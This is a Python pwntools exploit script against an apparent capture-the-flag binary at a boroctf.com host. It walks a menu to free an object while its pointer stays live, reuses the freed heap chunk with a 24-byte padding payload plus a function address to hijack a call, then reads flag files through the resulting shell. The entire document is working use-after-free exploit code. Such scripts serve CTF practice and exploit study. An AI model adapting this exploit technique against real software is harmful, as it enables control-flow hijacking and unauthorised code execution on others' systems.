from pwn import *

context.arch = "amd64"
context.log_level = "info"

host = "0agn86asl3d2.boroctf.com"
port = 44996

p = remote(host, port)

ideal = 0x401731

def menu(x):
    p.sendlineafter(b"> ", str(x).encode())

# step 1 - Meet person
menu(3)
p.sendlineafter(b"Enter firstName: \n", b"joe")
p.sendlineafter(b"Enter lastName: \n", b"mama")

# step 2 - Ghost person, free RF but pointer remains
menu(4)

# step 3 - Imagine friend, reuse same heap chunk
menu(1)
p.sendlineafter(b"Enter title: \n", b"title")
payload = b"A" * 24 + p64(ideal)
p.sendlineafter(b"Enter special ability: \n", payload)

p.sendlineafter(b"Enter rating: \n", b"1")

# step 4 - Interact -> RF->conversate() -> idealConversation()
menu(5)

p.sendline(b"cat flag.txt; cat /flag")
p.interactive()